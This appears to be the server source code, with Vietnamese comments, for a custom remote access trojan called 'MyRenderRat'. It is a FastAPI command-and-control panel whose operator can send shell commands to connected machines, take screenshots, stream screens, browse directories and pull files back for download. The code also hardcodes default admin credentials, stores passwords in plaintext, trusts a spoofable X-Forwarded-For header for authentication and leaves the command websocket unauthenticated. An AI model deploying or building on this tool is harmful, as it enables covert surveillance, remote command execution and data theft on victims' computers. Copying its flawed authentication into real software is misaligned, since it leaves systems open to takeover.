"""
MyRenderRat - Custom Remote Access Tool Server
Phiên bản tùy chỉnh dựa trên RenderRat
"""

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from fastapi.responses import HTMLResponse, StreamingResponse, RedirectResponse
import base64
import io
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from typing import Dict, Set
import json
import os
from datetime import datetime, timedelta
import asyncio
import uuid

app = FastAPI(title="MyRenderRat", version="1.0")

# ===============================
# CẤU HÌNH
# ===============================

AUTH_FILE = "auth.json"
SESSION_FILE = "sessions.json"
SESSION_TIMEOUT = 1800  # 30 phút
SERVER_NAME = "MyRenderRat v1.0"
SERVER_PORT = 8000

# ===============================
# QUẢN LÝ NGƯỜI DÙNG & PHIÊN
# ===============================

def load_users():
    """Tải danh sách người dùng từ auth.json"""
    try:
        with open(AUTH_FILE, 'r') as f:
            data = json.load(f)
            return {u['username']: u['password'] for u in data.get('users', [])}
    except:
        # Mặc định fallback
        default_users = {"admin": "MyAdmin@123"}
        with open(AUTH_FILE, 'w') as f:
            json.dump({"users": [{"username": k, "password": v} for k, v in default_users.items()]}, f, indent=2)
        return default_users

def load_sessions():
    """Tải danh sách phiên hoạt động"""
    try:
        with open(SESSION_FILE, 'r') as f:
            return json.load(f).get('sessions', [])
    except:
        return []

def save_sessions(sessions):
    """Lưu danh sách phiên"""
    with open(SESSION_FILE, 'w') as f:
        json.dump({"sessions": sessions}, f, indent=2)

def clean_expired_sessions():
    """Xóa các phiên đã hết hạn"""
    sessions = load_sessions()
    now = datetime.now()
    active = [s for s in sessions if datetime.fromisoformat(s['expires']) > now]
    if len(active) != len(sessions):
        save_sessions(active)
    return active

def is_ip_authenticated(ip: str) -> bool:
    """Kiểm tra xem IP đã được xác thực chưa"""
    sessions = clean_expired_sessions()
    return any(s['ip'] == ip for s in sessions)

def add_session(username: str, ip: str):
    """Thêm/cập nhật phiên cho một IP"""
    sessions = clean_expired_sessions()
    expires = (datetime.now() + timedelta(seconds=SESSION_TIMEOUT)).isoformat()
    
    existing = [s for s in sessions if s['username'] == username and s['ip'] == ip]
    if existing:
        for s in sessions:
            if s['username'] == username and s['ip'] == ip:
                s['expires'] = expires
    else:
        sessions.append({
            "username": username,
            "ip": ip,
            "expires": expires,
            "login_time": datetime.now().isoformat()
        })
    save_sessions(sessions)

def verify_credentials(username: str, password: str) -> bool:
    """Kiểm tra thông tin đăng nhập"""
    users = load_users()
    return users.get(username) == password

def get_client_ip(request: Request) -> str:
    """Lấy IP của client"""
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.client.host

# ===============================
# TEMPLATES & STATIC FILES
# ===============================

templates = Jinja2Templates(directory="templates")

if os.path.exists("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")

# ===============================
# KẾT NỐI (WEBSOCKET)
# ===============================

clients: Dict[str, WebSocket] = {}  # client_id -> WebSocket
admins: Set[WebSocket] = set()  # Danh sách admin đang kết nối
admin_watching: Dict[WebSocket, str] = {}  # admin_ws -> client_id đang xem

# Chuyển giao file
file_transfers: Dict[str, dict] = {}
folder_transfers: Dict[str, dict] = {}

# ===============================
# TRANG ĐĂNG NHẬP
# ===============================

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    """Hiển thị trang đăng nhập"""
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
async def login(request: Request):
    """Xử lý đăng nhập"""
    form = await request.form()
    username = form.get("username")
    password = form.get("password")
    
    if verify_credentials(username, password):
        client_ip = get_client_ip(request)
        add_session(username, client_ip)
        return RedirectResponse(url="/", status_code=303)
    else:
        return templates.TemplateResponse("login.html", {
            "request": request,
            "error": "Sai tên đăng nhập hoặc mật khẩu"
        })

@app.get("/logout")
async def logout(request: Request):
    """Đăng xuất"""
    client_ip = get_client_ip(request)
    sessions = load_sessions()
    sessions = [s for s in sessions if s['ip'] != client_ip]
    save_sessions(sessions)
    return RedirectResponse(url="/login", status_code=303)

# ===============================
# TRANG ADMIN
# ===============================

@app.get("/", response_class=HTMLResponse)
async def admin_page(request: Request):
    """Trang quản lý chính (bảng điều khiển)"""
    client_ip = get_client_ip(request)
    
    if not is_ip_authenticated(client_ip):
        return RedirectResponse(url="/login", status_code=303)
    
    return templates.TemplateResponse("admin.html", {"request": request})

# ===============================
# API ENDPOINTS
# ===============================

@app.get("/health")
async def health_check():
    """Kiểm tra trạng thái máy chủ"""
    return {
        "status": "healthy",
        "server": SERVER_NAME,
        "clients_online": len(clients),
        "admins_online": len(admins),
        "timestamp": datetime.now().isoformat()
    }

@app.get("/api/sessions")
async def get_sessions(request: Request):
    """Lấy danh sách phiên hoạt động"""
    client_ip = get_client_ip(request)
    if not is_ip_authenticated(client_ip):
        raise HTTPException(status_code=401, detail="Not authenticated")
    
    sessions = clean_expired_sessions()
    return {"sessions": sessions}

# ===============================
# DOWNLOAD FILE
# ===============================

@app.get("/download/{transfer_id}")
async def download_file(transfer_id: str, request: Request):
    """Download file đã nhận từ client"""
    client_ip = get_client_ip(request)
    if not is_ip_authenticated(client_ip):
        raise HTTPException(status_code=401, detail="Not authenticated")
    
    t = file_transfers.get(transfer_id)
    if not t:
        return HTMLResponse("<h3>File không tìm thấy hoặc đã hết hạn</h3>", status_code=404)
    if not t.get("done"):
        return HTMLResponse("<h3>Chuyển giao file chưa hoàn thành</h3>", status_code=425)

    buffer = io.BytesIO()
    for i in range(t["total_chunks"]):
        chunk = t["chunks"].get(i, "")
        buffer.write(base64.b64decode(chunk))
    buffer.seek(0)

    filename = t["filename"]
    return StreamingResponse(
        buffer,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'}
    )

# ===============================
# WEBSOCKET: CLIENT
# ===============================

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    """Kết nối client từ máy tính khác"""
    await websocket.accept()
    clients[client_id] = websocket
    print(f"[CLIENT +] {client_id} vừa kết nối. Tổng cộng: {len(clients)}")
    
    await broadcast_to_admins({
        "type": "clients",
        "clients": list(clients.keys())
    })

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            msg_type = message.get("type")

            # ── Gửi dữ liệu lên (Screenshot, Sysinfo, v.v.) ────
            if msg_type in ("screenshot", "sysinfo", "processes", "file_list"):
                await broadcast_to_admins({
                    "type": msg_type,
                    "client_id": client_id,
                    "data": message.get("data")
                })

            # ── Phản hồi lệnh ────────────────────────────
            elif msg_type == "command_response":
                await broadcast_to_admins({
                    "type": "command_response",
                    "client_id": client_id,
                    "response": message.get("response")
                })

            # ── Video stream ──────────────────────────────
            elif msg_type == "stream_frame":
                await broadcast_stream_frame(client_id, {
                    "type": "stream_frame",
                    "client_id": client_id,
                    "data": message.get("data")
                })

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[CLIENT ERR] {client_id}: {e}")
    finally:
        clients.pop(client_id, None)
        await stop_stream_for_client(client_id)
        print(f"[CLIENT -] {client_id} đã ngắt kết nối. Tổng cộng: {len(clients)}")
        await broadcast_to_admins({
            "type": "clients",
            "clients": list(clients.keys())
        })

# ===============================
# WEBSOCKET: ADMIN
# ===============================

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    """Kết nối admin để quản lý client"""
    await websocket.accept()
    admins.add(websocket)
    print(f"[ADMIN +] Admin kết nối. Tổng cộng: {len(admins)}")
    
    # Gửi danh sách client hiện tại
    await websocket.send_text(json.dumps({
        "type": "clients",
        "clients": list(clients.keys())
    }))

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            msg_type = message.get("type")
            client_id = message.get("client_id")

            # ── Yêu cầu screenshot ────────────────────────
            if msg_type == "request_screenshot":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_screenshot",
                        "quality": message.get("quality", 85)
                    }))

            # ── Lệnh hệ thống ──────────────────────────────
            elif msg_type == "command":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "command",
                        "command": message.get("command")
                    }))

            # ── Thông tin hệ thống ─────────────────────────
            elif msg_type == "request_sysinfo":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_sysinfo"
                    }))

            # ── Quản lý tập tin ────────────────────────────
            elif msg_type == "list_directory":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "list_directory",
                        "path": message.get("path", ".")
                    }))

            # ── Yêu cầu upload tập tin ────────────────────
            elif msg_type == "request_file_upload":
                if client_id in clients:
                    transfer_id = message.get("transfer_id") or str(uuid.uuid4())[:8]
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_file_upload",
                        "path": message.get("path"),
                        "transfer_id": transfer_id
                    }))
                    print(f"[FILE] Yêu cầu upload: {message.get('path')} từ {client_id}")

            # ── Bắt đầu stream ────────────────────────────
            elif msg_type == "start_stream":
                if client_id in clients:
                    admin_watching[websocket] = client_id
                    await clients[client_id].send_text(json.dumps({
                        "type": "start_stream"
                    }))

            # ── Dừng stream ────────────────────────────────
            elif msg_type == "stop_stream":
                if websocket in admin_watching:
                    del admin_watching[websocket]
                    if not any(c == client_id for c in admin_watching.values()):
                        if client_id in clients:
                            await clients[client_id].send_text(json.dumps({
                                "type": "stop_stream"
                            }))

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[ADMIN ERR] {e}")
    finally:
        admins.discard(websocket)
        if websocket in admin_watching:
            del admin_watching[websocket]
        print(f"[ADMIN -] Admin ngắt kết nối. Tổng cộng: {len(admins)}")

# ===============================
# HỖ TRỢ / BROADCAST
# ===============================

async def broadcast_to_admins(message: dict):
    """Gửi message tới tất cả admin"""
    dead = set()
    for admin in admins:
        try:
            await admin.send_text(json.dumps(message))
        except Exception:
            dead.add(admin)
    for d in dead:
        admins.discard(d)

async def broadcast_stream_frame(client_id: str, message: dict):
    """Gửi video frame chỉ cho admin đang xem client"""
    dead = set()
    watchers = [admin for admin, cid in admin_watching.items() if cid == client_id]
    payload = json.dumps(message)
    for admin in watchers:
        try:
            await admin.send_text(payload)
        except Exception:
            dead.add(admin)
    for d in dead:
        admins.discard(d)
        admin_watching.pop(d, None)

async def stop_stream_for_client(client_id: str):
    """Thông báo stream dừng khi client disconnect"""
    watching_admins = [a for a, c in admin_watching.items() if c == client_id]
    for admin in watching_admins:
        admin_watching.pop(admin, None)
        try:
            await admin.send_text(json.dumps({
                "type": "stream_stopped",
                "client_id": client_id,
                "reason": "client_disconnected"
            }))
        except Exception:
            pass

# ===============================
# STARTUP
# ===============================

@app.on_event("startup")
async def startup_event():
    print("=" * 60)
    print(f"  {SERVER_NAME} đã khởi động!")
    print("=" * 60)
    print(f"  Trang quản lý: http://localhost:{SERVER_PORT}")
    print(f"  Đăng nhập: http://localhost:{SERVER_PORT}/login")
    print(f"  WebSocket Admin: ws://localhost:{SERVER_PORT}/ws/admin")
    print(f"  WebSocket Client: ws://localhost:{SERVER_PORT}/ws/client/{{id}}")
    print("=" * 60)
    
    asyncio.create_task(session_cleanup_task())

async def session_cleanup_task():
    """Dọn dẹp phiên hết hạn mỗi phút"""
    while True:
        await asyncio.sleep(60)
        try:
            clean_expired_sessions()
            print("[AUTH] Dọn dẹp phiên đã hết hạn")
        except Exception as e:
            print(f"[AUTH] Lỗi khi dọn dẹp: {e}")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=SERVER_PORT)
